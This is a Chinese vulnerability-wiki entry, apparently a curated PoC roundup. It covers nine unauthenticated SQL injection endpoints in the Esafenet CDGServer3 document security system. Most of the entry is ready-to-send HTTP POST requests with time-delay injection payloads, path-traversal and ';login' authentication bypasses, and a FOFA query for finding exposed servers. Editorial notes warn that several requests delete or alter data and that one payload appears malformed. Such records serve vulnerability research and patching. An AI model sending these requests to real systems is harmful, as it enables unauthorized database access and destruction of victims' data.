---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "亿赛通电子文档安全管理系统 9端点SQL 注入集合"
product: "亿赛通电子文档安全管理系统"
record_type: "roundup"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本"
prerequisites: "声称未认证，/js/../及;login绕过依赖部署"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E5%BF%86%E8%B5%9B%E9%80%9A/%E5%BF%86%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%209%E5%A4%84%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.md"
fofa: "body=\"/CDGServer3/index.jsp\""
fofa_unverified: "body="
id: "vw-88e9082a7ac4350c108a9c35"
entity_id: "ve-88e9082a7ac4350c108a9c35"
schema_version: "1"
---

# 亿赛通电子文档安全管理系统 9端点SQL 注入集合

## 条目说明

- 对象与具体问题：亿赛通电子文档安全管理系统；9端点SQLi集合
- 版本、配置及部署条件：无版本
- 认证与权限前提：声称未认证，/js/../及;login绕过依赖部署
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 标题忆赛通与常见亿赛通命名需规范官方产品，分类应文档安全非ERP
- delServer/DelSecureUsb/delFileFormat/delNotice/upPriority属于状态改变端点，不能批量无害检测
- DocInfo logicpath==多等号疑误；全请求无代码围栏
- 九端点需要各自判据/版本，全文无任何响应图，单延时无基线；在野广影响无证

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 漏洞描述

忆赛通电子文档安全管理系统存在多处SQL注入漏洞，未经身份验证的远程攻击者可利用此漏洞获取数据库敏感信息，进一步利用可获取服务器权限。

## 影响范围

忆赛通电子文档安全管理系统

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 中 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：body="/CDGServer3/index.jsp"

POC/EXP1：/CDGServer3/js/../OrganiseAjax

```http
POST /CDGServer3/js/../OrganiseAjax HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded

command=search&groupNameSearch=-1'waitfor delay '0:0:5'--
```

POC/EXP2：/CDGServer3/js/../MultiServerAjax

```http
POST /CDGServer3/js/../MultiServerAjax HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded

command=delServer&serverId=-1'waitfor delay '0:0:5'--
```

POC/EXP3：/CDGServer3/js/../LogicGroupAjax

```http
POST /CDGServer3/js/../LogicGroupAjax HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded

command=isExist&logicGroupName=-1'waitfor delay '0:0:5'--
```

POC/EXP4：/CDGServer3/device/SecureUsbService;login

```http
POST /CDGServer3/device/SecureUsbService;login HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded

command=DelSecureUsb&id=a';WAITFOR+DELAY+'0:0:5'--
```

POC/EXP5：/CDGServer3/js/../DeviceAjax

```http
POST /CDGServer3/js/../DeviceAjax HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded

command=delSecureUsb&SecureUsbid=-1'waitfor delay '0:0:5'--
```

POC/EXP6：/CDGServer3/js/../FileFormatAjax

```http
POST /CDGServer3/js/../FileFormatAjax HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded

command=delFileFormat&fileFormatId=-1'waitfor delay '0:0:5'--
```

POC/EXP7：/CDGServer3/js/../NetSecPolicyAjax

```http
POST /CDGServer3/js/../NetSecPolicyAjax HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded

command=upPriority&id=-1'waitfor delay '0:0:5'--
```

POC/EXP8：/CDGServer3/js/../NoticeAjax 

```http
POST /CDGServer3/js/../NoticeAjax HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded

command=delNotice&noticeId=-1'waitfor delay '0:0:5'--
```

POC/EXP9：/CDGServer3/js/../DocInfoAjax

```http
POST /CDGServer3/js/../DocInfoAjax HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded

command=JudgeHasFile&logicpath==-1'waitfor delay '0:0:5'--
```

进行遍历检查


## 修复方案

**官方修复：**

使用预编译SQL语句

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
